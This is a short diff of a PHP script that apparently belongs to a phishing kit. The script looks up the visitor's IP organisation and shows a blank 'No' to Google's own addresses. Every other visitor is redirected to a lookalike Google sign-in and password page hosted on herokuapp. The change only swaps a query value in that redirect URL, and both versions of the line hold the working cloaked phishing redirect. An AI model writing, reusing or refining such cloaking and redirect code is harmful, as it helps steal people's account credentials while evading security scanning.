@@ -7,7 +7,7 @@ $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
 if (strpos($details->org, 'Google') !== false) {
 	echo "No";
 } else {
-	echo '<meta http-equiv="refresh" content="0; url=https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?06">';
+	echo '<meta http-equiv="refresh" content="0; url=https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?05">';
 }
 exit;
 ?>
